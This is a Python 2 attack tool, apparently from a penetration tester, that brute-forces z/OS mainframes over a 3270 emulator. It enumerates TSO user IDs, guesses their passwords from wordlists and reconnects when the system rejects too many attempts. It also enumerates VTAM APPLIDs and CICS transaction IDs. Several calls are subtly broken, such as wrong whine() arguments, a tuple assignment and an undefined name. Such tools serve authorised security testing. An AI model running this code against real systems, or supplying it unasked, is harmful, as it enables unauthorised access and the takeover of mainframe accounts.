#!/usr/bin/env python

# Tool to brute force APPLIDs on a z/OS mainframe where you can connect to VTAM
# Truthfully, it's just a useful way of automating mainframe screen
# interactions, i.e. I make copies of this to perform specific fuzzing/user
# enum/password bruting attacks against custom apps It is a fork from
# mainframed's https://github.com/mainframed/TSO-Brute and most of the credit
# goes to him If you want to brute TSO usernames/passwords rather use his
# psiotik tool https://github.com/mainframed/psikotik Two most useful
# improvements are the error-aware safe_send and find_response extensions of
# py3270
# The original was GPL'ed and hence so is this
# Dominic White @singe dominic () sensepost.com

from py3270wrapper import WrappedEmulator
import time
import sys 
import argparse
import re
import platform

# Print output that can be surpressed by a CLI opt
def whine(text, kind='clear', level=0):
	if results.quiet and (kind == 'warn' or kind == 'info'):
			return
	else:
		typdisp = ''
		lvldisp = ''
		if kind == 'warn': typdisp = '[!] '
		elif kind == 'info': typdisp = '[+] '
		elif kind == 'err': typdisp = '[#] '
		elif kind == 'good': typdisp = '[*] '
		if level == 1: lvldisp = "\t"
		elif level == 2: lvldisp = "\t\t"
		elif level == 3: lvldisp = "\t\t\t"
		print lvldisp+typdisp+text

def check_CICS(em):
	whine('Checking if in CICS',kind='info')
	em.delete_field()
	em.send_string('CESF') #CICS CESF is the Signoff command
	em.send_enter()

	if em.find_response( 'Sign-off is complete'):
		whine('Mainframe is in CICS',kind='good')
		return True
	else:
		em.send_pf3() #If we're in a CICS sign-on screen, exit it
		em.delete_field()
		em.send_string('CESF') #CICS signoff command
		em.send_enter()

		if em.find_response( 'Sign-off is complete'):
			whine('Mainframe is in CICS',kind='good')
			return True
		else:
			whine('Mainframe not in CICS, exiting',kind='err')
			return False

	return False

def enter_CICS(em):
	whine('Trying to get to CICS console',kind='info')
	#todo: add support for defining file-based macros to do this
	#You'll need to add the set of commands to get to the CICS console here
	em.send_enter()
	em.send_string('CICS')
	em.send_enter()
	time.sleep(2)
	em.exec_command('Wait(InputField)')
	em.send_string('3')
	em.send_enter()
	em.send_pf3()

# Check if we are in VTAM mode
def check_VTAM(em):
	whine('Checking if in VTAM',kind='info')
	#Test command enabled in the session-level USS table ISTINCDT, should always work
	em.send_string('IBMTEST')
	em.send_enter()
	if not em.find_response( 'IBMECHO ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'):
		for i in xrange(1,3):
			time.sleep(results.sleep+i)
			if em.find_response( 'IBMECHO ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'):
				results.sleep += 1
				whine('The host is slow, increasing delay by 1s to: ' + str(results.sleep),kind='warn')
				return True
		whine('Mainframe not in VTAM, aborting',kind='err')
		check_CICS(em) #All may not be lost
		return False
	elif em.find_response( 'REQSESS error'):
		whine('Mainframe may be in a weird VTAM, continuing reluctantly',kind='warn')
	else:
		return True

def enter_TSOPanel(em):
	whine('Getting to TSO/E Logon Panel',kind='info')
	#todo: add support for defining file-based macros to do this
	#You'll need to add the set of commands to get to the CICS console here
	em.send_string('TSO')
	em.send_enter()

	time.sleep(2)
	em.exec_command('Wait(InputField)')
	em.send_string('TSOFAKE')
	em.send_enter() 

	if not em.find_response( 'TSO/E LOGON'):
		whine('Not at TSO/E Logon screen. Aborting.',kind='err')
		return False
	whine('At TSO/E Logon Panel',kind='info',level=1)
	return True

def connect_zOS(em, target):
	whine('Connecting to ' + results.target,kind='info')
	em.connect(target)

	if not em.is_connected():
		whine('Could not connect to ' + results.target + '. Aborting.',kind='err')
		sys.exit(1)

def validate_text(name,size=7,kind='Username'):
	if name[0].isdigit(): #starts with number
		whine(kind+':', name.strip() ,' '+kind+'s cannot start with a number, skipping',kind='warn',level=1)
		return False
	elif not re.match("^[a-zA-Z0-9#@$]+$", name): #disallowed chars
		whine(kind+':', name.strip() ,' '+kind+' contains an invalid character (Only A-z, 0-9, #, $ and @), skipping',kind='warn',level=1)
		return False
	elif len(name.strip()) > size: #too long
		whine(kind+':', name.strip() ,'User name too long ( >7 )',kind='warn',level=1)
		return False
	return True #valid

def brute_TSO(em,results,userfile,passfile=''):
	whine('Starting TSO User Enumeration',kind='info',level=1)
	valid_users = list()

	for username in userfile:
		if not validate_text(username,7):
			continue
		
		# Enter the username
		em.safe_fieldfill(06, 20, username.strip(), 7)
		em.move_to(1,1)
		em.send_enter()
		print em.screen_get()
		gooduser = False

		# We've tried too many attempts and need to reconnect
		if em.find_response( 'LOGON REJECTED, TOO MANY ATTEMPTS'):
			em.reconnect()
			enter_TSOPanel()
			em.safe_fieldfill(06, 20, username.strip(), 7)
			em.send_enter()

		# Look for output showing the user exists
		if em.find_response( 'Enter current password for'):
			gooduser = True
		elif em.find_response( 'LOGON REJECTED, RACF TEMPORARILY REVOKING USER'):
			gooduser = True
		# Allow for additional responses to be defined

		# We found a username
		if gooduser:
			whine('Username:', username.strip() ,' TSO User Found!',kind='good',level=1)
			valid_users.append((username.strip(),''))
		else:
			whine('Username: ' + username.strip() + ' Not a TSO User',kind='warn',level=1)

		# Password brute force
		validpass = True
		if gooduser and not results.enumeration:
			whine('Starting Password brute forcer',kind='info',level=1)
			passfile=open(results.passfile) #open the passwords file
			for password in passfile:
				if not validate_text(password,8,kind='Password'):
					continue

				# Enter the password
				em.safe_fieldfill(8, 20, password.strip(),8)
				em.send_enter()

				# We've tried too many attempts and need to reconnect
				if em.find_response( 'LOGON REJECTED, TOO MANY ATTEMPTS'):
					em.reconnect()
					enter_TSOPanel(em)
					em.safe_fieldfill(06, 20, username.strip(), 7)
					em.safe_fieldfill(8, 20, password.strip(),8)
					em.send_enter()

				# Check the responses
				if em.find_response( 'PASSWORD NOT AUTHORIZED FOR USERID'):
					validpass = False
				elif em.find_response( 'LOGON REJECTED'):						
					validpass = False
				# todo: add code to deal with a locked out account

				# Good user and good pass
				if validpass:
					whine(password.strip() + ' Password Found!!',kind='good',level=2)
					valid_users[len(valid_users)-1][1] = username.strip()	
					em.reconnect()
					enter_TSOPanel(em)
					break #Skip to next userid
				# Good user but bad pass
				else:
					whine(password.strip() + ' Invalid Password',kind='warn',level=2)
 			passfile.close()

		if not validpass and not results.enumeration:
			whine('No valid passwords found for user' + username.strip(),kind="warn",level=2)

	userfile.close()

	whine('Found ' + str(len(valid_users)) + ' valid user accounts:',kind="good",level=0)
	for enum_user in valid_users:
		whine('Valid User ID -> ' + enum_user,level=1)

def brute_APPLID(em,results,appfile):
	whine('Starting APPLID Enumeration',kind='info',level=1)
	valid_apps = list()
	cmdtype = "APPLID" #Can be APPLID, MACRO or PF
	noapplid = False #Don't skip APPLID checks
	screenshot_before = ''
	screenshot_after = ''
	screenshot_logon = em.screen_get() #this isn't working ;(

	for applid in appfile:
		if applid[0] == "!": #Prefix MACROs with a !
			applid = applid[1:len(applid)]
			cmdtype = "MACRO"	
		elif applid[0] == "#": #Prefix PF's with a #
			applid = applid[1:len(applid)]
			cmdtype = "PF"
		else:
			cmdtype = "APPLID"
		
		em.delete_field() #Some inputs are dumb, and we need to blank the previous command
		if cmdtype == 'APPLID' and validate_text(applid,8,cmdtype):
			if noapplid: #LOGON launches TSO, so skips APPLID checks
				break
			em.safe_send('LOGON APPLID('+applid.strip()+')')
		elif cmdtype == "MACRO":
			em.safe_send(applid.strip())
		elif cmdtype == "PF":
			em.exec_command(applid.strip())
		screenshot_before = em.screen_get()
		if not cmdtype == 'PF' and screenshot_before == screenshot_after:
			# Check if the screen has been locked and our input is being ignored
			whine('Something\'s wrong, trying to reconnect...',kind='err',level=0)
			em.reconnect()
		em.send_enter()
		screenshot_after = em.screen_get()

		badcmd = False
		if em.is_connected():
			if em.find_response( 'COMMAND UNRECOGNIZED'):
				badcmd = True
			elif em.find_response( 'SESSION NOT BOUND'):
				badcmd = True
			elif em.find_response( 'INVALID COMMAND'):
				badcmd = True
			elif em.find_response( 'PARAMETER OMITTED'):
				badcmd = True
			elif em.find_response( 'REQUERIDO PARAMETRO PERDIDO'):
				badcmd = True
			elif em.find_response( 'Your command is unrecognized'):
				badcmd = True
			elif em.find_response( 'invalid command or syntax'):
				badcmd = True
			elif em.find_response( 'UNABLE TO ESTABLISH SESSION'):
				badcmd = True
			elif em.find_response( 'UNSUPPORTED FUNCTION'):
				badcmd = True
			elif em.find_response( 'REQSESS error'):
				badcmd = True
			elif em.find_response( 'syntax invalid'):
				badcmd = True
			elif em.find_response( 'INVALID SYSTEM'):
				badcmd = True
			elif em.find_response( 'NOT VALID'):
				badcmd = True
			elif em.find_response( 'COMMAND UNRECOGNIZED'):
				badcmd = True
			elif em.find_response( 'INVALID USERID, APPLID'):
				badcmd = False
				noapplid = True
				whine('LOGON launches TSO, skipping further APPLIDs',kind='warn',level=1)
				applid = "TSO" #This is a TSO error message for when the LOGON command is using TSO
			elif screenshot_before == screenshot_after or screenshot_logon == screenshot_after:
				badcmd = True
			if badcmd:
				whine(cmdtype + ': ' + applid.strip() + ' Invalid (bad response)',kind='warn',level=1)
			else:
				whine(cmdtype + ': ' + applid.strip() + ' ' + cmdtype + ' Found!',kind='good',level=1)
				valid_apps.append((applid.strip(),cmdtype))
				em.reconnect() #We need to close and reconnect to exit the app

		else: # we were disconnected
			whine(cmdtype+': ' + applid.strip() + ' Invalid (disconnected)',kind='warn',level=1)
			em.reconnect() #We need to close and reconnect to exit the app

	whine('Found ' + str(len(valid_apps)) + ' valid ' + cmdtype+'s:',kind='good',level=0)
	for enum_apps in valid_apps:
		whine(enum_apps[1]+' -> '+enum_apps[0],level=1)

def brute_CICS(em,results,transfile):
	whine('Starting CICS Trans ID Enumeration',kind='info',level=1)
	valid_trans = list()
	screenshot_before = ''
	screenshot_after = ''

	for transid in transfile:
		em.delete_field() #Some inputs are dumb, and we need to blank the previous command
		if validate_text(transid,10,'TRANSID'): #todo, are there length restrictions?
			em.safe_send(transid.strip())
		screenshot_before = em.screen_get()
		if screenshot_before == screenshot_after:
			# Check if the screen has been locked and our input is being ignored
			whine('Something\'s wrong, trying to reconnect...',kind='err',level=0)
			em.reconnect()
			enter_CICS(em)
		em.send_enter()
		screenshot_after = em.screen_get()

		badcmd = False
		if em.is_connected():
			if em.find_response( 'is not recognized'):
				badcmd = True
			elif em.find_response( 'sign on or have the right security'):
				badcmd = True
			elif screenshot_before == screenshot_after:
				badcmd = True
				em.reconnect() #We need to close and reconnect to exit the app
				enter_CICS(em)
			elif em.find_response( 'Sign-off is complete'):
				badcmd = False
				em.reconnect()
				enter_CICS(em)

			if badcmd:
				whine('TRANSID: ' + transid.strip() + ' Invalid (bad response)',kind='warn',level=1)
			else:
				whine('TRANSID: ' + transid.strip() + ' TRANSID Found!',kind='good',level=1)
				valid_trans.append(transid.strip())

		else: # we were disconnected
			whine(cmdtype+': ' + transid.strip() + ' Invalid (disconnected)',kind='warn',level=1)
			em.reconnect() #We need to close and reconnect to exit the app
			enter_CICS(em)

	whine('Found ' + str(len(valid_trans)) + ' valid TRANSIDs:',kind='good',level=0)
	for enum_trans in valid_trans:
		whine('TRANSID -> '+enum_trans,level=1)

# Define and fetch commandline arguments
parser = argparse.ArgumentParser(description='z/OS Mainframe Bruteforcer', epilog='Get to it!')
parser.add_argument('-x', '--target', help='Target IP address or Hostname and port: TARGET[:PORT] default port is 23', required=True, dest='target')
parser.add_argument('-t', '--tso', help='Enable TSO user brute forcing', default=False, dest='tso', action='store_true')
parser.add_argument('-v', '--vtam', help='Enable VTAM APPLID brute forcing', default=False, dest='vtam', action='store_true')
parser.add_argument('-c', '--cics', help='Enable CICS transID brute forcing', default=False, dest='cics', action='store_true')
parser.add_argument('-s', '--sleep', help='Seconds to sleep between actions (increase on slower systems). The default is 0 seconds.', default=0, type=float, dest='sleep')
parser.add_argument('-u', '--userfile', help='File containing list of usernames', dest='userfile')
parser.add_argument('-p', '--passfile', help='File containing list of passwords', dest='passfile')
parser.add_argument('-a', '--appfile', help='File containing list of APPLIDs', dest='appfile')
parser.add_argument('-i', '--transfile', help='File containing list of TRANSIDs', dest='transfile')
parser.add_argument('-m', '--moviemode', help='Enables ULTRA AWESOME Movie Mode. Watch the system get hacked in real time!', default=False, dest='movie_mode', action='store_true')
parser.add_argument('-e', '--enumerate', help='Enables TSO Enumeration Mode Only. Default is password brute force mode', default=False, dest='enumeration', action='store_true')
parser.add_argument('-q', '--quiet', help='Only display found users / found passwords', default=False, dest='quiet', action='store_true')
results = parser.parse_args()

#A password file is required if we're not in enumeration mode
if results.tso and not results.userfile:
	whine('TSO mode requires Users file (-u)! Aborting.',kind='err')
	sys.exit(1)
elif results.tso and not results.passfile and not results.enumeration:
	whine('Not in Enumeration mode (-e). Password file (-p) required! Aborting.',kind='err')
	sys.exit(1)
elif results.vtam and not results.appfile:
	whine('VTAM mode requires APPLID file (-a)! Aborting.',kind='err')
	sys.exit(1)
elif results.cics and not results.transfile:
	whine('CICS mode requires TRANSID file (-c)! Aborting.',kind='err')
	sys.exit(1)

# Parse commandline arguments
whine('z/OS Mainframe Bruteforcer',kind='info')
whine('Target Acquired\t\t: ' + results.target,kind='info')
if results.vtam:
	whine('APPLID Bruting\t\t: Enabled',kind='info')
	whine('APPLID File\t\t\t: ' + results.appfile,kind='info')
	appfile=open(results.appfile) #open the appids file
elif results.tso:
	whine('TSO/E Bruting\t\t: Enabled',kind='info')
	whine('You should probably use https://github.com/mainframed/psikotik/ instead.',kind=info)
	whine('Username File\t\t: ' + str(results.userfile),kind='info')
	userfile=open(results.userfile) #open the usernames file
	if not results.enumeration:
		whine('Password Bruting\t\t: Enabled',kind='info')
		whine('Passwords File\t\t: ' + results.passfile,kind='info')
		passfile=open(results.passfile) #open the passwords file
elif results.cics:
	whine('CICS Bruting\t\t: Enabled',kind='info')
	transfile=open(results.transfile) #open the transid file
	#whine('CICS Bruting not done yet...',kind='err')
	#sys.exit(1)
	
whine('Slowdown is\t\t\t: ' + str(results.sleep),kind='info')
whine('Attack platform\t\t: ' + platform.system(),kind='info')

if results.movie_mode and not platform.system() == 'Windows':
	whine('ULTRA Hacker Movie Mode\t: Enabled',kind='info')
	#Enables Movie Mode which uses x3270 so it looks all movie like
	em = WrappedEmulator(visible=True,delay=results.sleep)
elif results.movie_mode and platform.system() == 'Windows':
	whine('ULTRA Hacker Movie Mode not supported on Windows',kind='warn')
	em = WrappedEmulator(delay=results.sleep)
else:
	whine('ULTRA Hacker Movie Mode\t: Disabled',kind='info')
	em = WrappedEmulator(delay=results.sleep)
if results.quiet:
	whine('Quiet Mode Enabled\t: Shhhhhhhhh!',type='warn')

connect_zOS(em,results.target) #connect to the host

# Perform a VTAM APPLID brute
if results.vtam and check_VTAM(em):
	brute_APPLID(em,results,appfile)
	appfile.close()
elif results.tso: #perform a TSO/E brute
	if enter_TSOPanel(em):
		if results.passfile:
			brute_TSO(em, results, userfile, passfile)
		else:
			brute_TSO(em, results, userfile)
	userfile.close()
	if results.passfile: passfile.close()
elif results.cics: #perform a CICS brute
	enter_CICS(em)
	if check_CICS(em):
		em.reconnect()
		enter_CICS(em)
		brute_CICS(em, results, transfile)
	transfile.close()

# And we're done. Close the connection
em.terminate()
